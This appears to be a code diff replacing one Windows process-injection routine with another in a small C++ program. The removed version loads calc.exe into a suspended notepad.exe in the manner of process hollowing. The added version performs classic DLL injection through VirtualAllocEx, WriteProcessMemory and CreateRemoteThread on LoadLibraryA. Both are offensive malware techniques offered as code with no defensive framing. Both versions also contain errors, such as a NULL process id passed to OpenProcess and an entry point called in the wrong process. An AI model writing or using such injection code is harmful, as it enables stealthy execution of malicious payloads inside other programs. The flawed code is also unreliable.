@@ -1,79 +1,77 @@
-#include <windows.h>
-#include <stdio.h>
+#include <iostream>
+#include <Windows.h>
 
-// Function pointer type for the loaded executable's entry point
-typedef int (__stdcall *ENTRYPOINT)();
+int main()
+{
+    const char* target_process_name = "notepad.exe";
+    const char* payload_file_name = "calc.exe";
+    const char* cmd_line_args = "";
 
-int main() {
-    // Open the target executable file
-    FILE* fp = fopen("calc.exe", "rb");
-    if (!fp) {
-        printf("Failed to open executable file.\n");
+    // 1. Open the target process for writing
+    HANDLE target_process_handle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, NULL);
+    if (!target_process_handle)
+    {
+        std::cerr << "Failed to open target process: " << GetLastError() << std::endl;
         return 1;
     }
 
-    // Get the file size
-    fseek(fp, 0, SEEK_END);
-    long fileSize = ftell(fp);
-    fseek(fp, 0, SEEK_SET);
+    // 2. Get the full path to the payload file
+    char payload_full_path[MAX_PATH];
+    GetFullPathName(payload_file_name, MAX_PATH, payload_full_path, NULL);
 
-    // Allocate memory to hold the executable file contents
-    BYTE* fileData = new BYTE[fileSize];
-    if (!fileData) {
-        printf("Failed to allocate memory for file contents.\n");
+    // 3. Create a suspended process to act as a host for the payload
+    STARTUPINFOA startup_info;
+    PROCESS_INFORMATION process_info;
+
+    ZeroMemory(&startup_info, sizeof(startup_info));
+    startup_info.cb = sizeof(startup_info);
+    ZeroMemory(&process_info, sizeof(process_info));
+
+    if (!CreateProcessA(target_process_name, (LPSTR)cmd_line_args, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startup_info, &process_info))
+    {
+        std::cerr << "Failed to create process: " << GetLastError() << std::endl;
         return 1;
     }
 
-    // Read the executable file into memory
-    if (fread(fileData, 1, fileSize, fp) != fileSize) {
-        printf("Failed to read file data into memory.\n");
+    // 4. Allocate memory in the target process for the payload
+    LPVOID remote_payload_addr = VirtualAllocEx(target_process_handle, NULL, strlen(payload_full_path) + 1, MEM_COMMIT, PAGE_READWRITE);
+    if (!remote_payload_addr)
+    {
+        std::cerr << "Failed to allocate memory in target process: " << GetLastError() << std::endl;
         return 1;
     }
 
-    // Close the file handle
-    fclose(fp);
-
-    // Get a handle to the current process
-    HANDLE currentProcessHandle = GetCurrentProcess();
-
-    // Create a new process in a suspended state
-    PROCESS_INFORMATION processInfo = {0};
-    STARTUPINFO startupInfo = {0};
-    startupInfo.cb = sizeof(STARTUPINFO);
-    if (!CreateProcess(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo)) {
-        printf("Failed to create new process.\n");
+    // 5. Write the payload file name to the target process memory
+    if (!WriteProcessMemory(target_process_handle, remote_payload_addr, payload_full_path, strlen(payload_full_path) + 1, NULL))
+    {
+        std::cerr << "Failed to write to target process memory: " << GetLastError() << std::endl;
         return 1;
     }
 
-    // Allocate memory in the remote process for the executable file contents
-    LPVOID remoteMemory = VirtualAllocEx(processInfo.hProcess, NULL, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (!remoteMemory) {
-        printf("Failed to allocate memory in remote process.\n");
+    // 6. Get the address of LoadLibraryA in the kernel32.dll module
+    LPVOID kernel32_dll_addr = GetModuleHandleA("kernel32.dll");
+    LPVOID load_library_addr = GetProcAddress((HMODULE)kernel32_dll_addr, "LoadLibraryA");
+
+    // 7. Create a remote thread in the target process to execute the payload
+    HANDLE remote_thread_handle = CreateRemoteThread(target_process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_addr, remote_payload_addr, 0, NULL);
+    if (!remote_thread_handle)
+    {
+        std::cerr << "Failed to create remote thread: " << GetLastError() << std::endl;
         return 1;
     }
 
-    // Write the executable file contents to the remote process
-    if (!WriteProcessMemory(processInfo.hProcess, remoteMemory, fileData, fileSize, NULL)) {
-        printf("Failed to write data to remote process memory.\n");
-        return 1;
-    }
+    // 8. Resume the target process
+    ResumeThread(process_info.hThread);
 
-    // Get the entry point for the loaded executable
-    ENTRYPOINT entryPoint = (ENTRYPOINT)((DWORD_PTR)remoteMemory + ((IMAGE_NT_HEADERS*)((DWORD_PTR)fileData + ((IMAGE_DOS_HEADER*)fileData)->e_lfanew))->OptionalHeader.AddressOfEntryPoint);
+    // 9. Wait for the remote thread to complete
+    WaitForSingleObject(remote_thread_handle, INFINITE);
 
-    // Resume the suspended process, executing the loaded executable from memory
-    if (ResumeThread(processInfo.hThread) == -1) {
-        printf("Failed to resume thread.\n");
-        return 1;
-    }
+    // 10. Cleanup
+    CloseHandle(remote_thread_handle);
+    VirtualFreeEx(target_process_handle, remote_payload_addr, strlen(payload_full_path) + 1, MEM_RELEASE);
+    CloseHandle(target_process_handle);
+    CloseHandle(process_info.hThread);
+    CloseHandle(process_info.hProcess);
 
-    // Call the loaded executable's entry point
-    int result = entryPoint();
-
-    // Clean up and exit
-    VirtualFreeEx(processInfo.hProcess, remoteMemory, fileSize, MEM_RELEASE);
-    CloseHandle(processInfo.hThread);
-    CloseHandle(processInfo.hProcess);
-    delete[] fileData;
     return 0;
 }
